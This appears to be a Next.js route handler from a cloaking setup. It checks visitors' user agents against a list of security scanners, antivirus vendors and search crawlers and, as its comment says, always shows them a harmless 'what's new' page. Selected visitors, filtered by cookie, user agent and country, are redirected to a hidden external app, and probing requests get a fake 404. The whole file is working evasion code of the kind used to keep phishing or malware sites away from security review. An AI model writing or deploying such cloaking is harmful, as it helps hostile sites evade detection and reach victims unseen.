import { cookies, headers } from "next/headers";
import { redirect } from "next/navigation";
import { shouldOpenNotes } from "./actions";
import { NextResponse } from "next/server";

const SCANNER_PATTERN = /virustotal|urlscan|vt-|vtintel|quttera|threatcrowd|hybrid-analysis|joesandbox|censys|shodan|zgrab|malwarebytes|paloalto|fortinet|kaspersky|bitdefender|googlebot|bingbot|facebookexternalhit|semrush|ahrefs/i;

export async function GET() {
  const headersList = await headers();
  const cookieStore = await cookies();

  const clientId = cookieStore.get("clientId");
  const country = headersList.get("x-user-country");
  const ua = headersList.get("x-user-agent");

  // security scanners always see the plain page
  if (ua && SCANNER_PATTERN.test(ua)) {
    redirect("/whats-new");
  }

  const accept = headersList.get("accept") || "";
  const isFetchLike =
    headersList.get("x-requested-with") === "XMLHttpRequest" ||
    (accept.includes("application/json") && !accept.includes("text/html")) ||
    headersList.get("sec-fetch-mode") === "cors" ||
    headersList.get("sec-fetch-dest") === "empty";

  if (clientId) {
    const openNotes = await shouldOpenNotes({
      clientId: clientId.value,
      ua: ua || "",
      country: country || "",
    });

    const allowlist: string[] = [];

    if (openNotes || allowlist.includes(clientId.value)) {
      return NextResponse.redirect(`${process.env.APP_URL}?uuid=${clientId.value}`);
    }
  }

  if (isFetchLike) {
    return new NextResponse("Not Found", { status: 404 });
  }

  redirect("/whats-new");
}
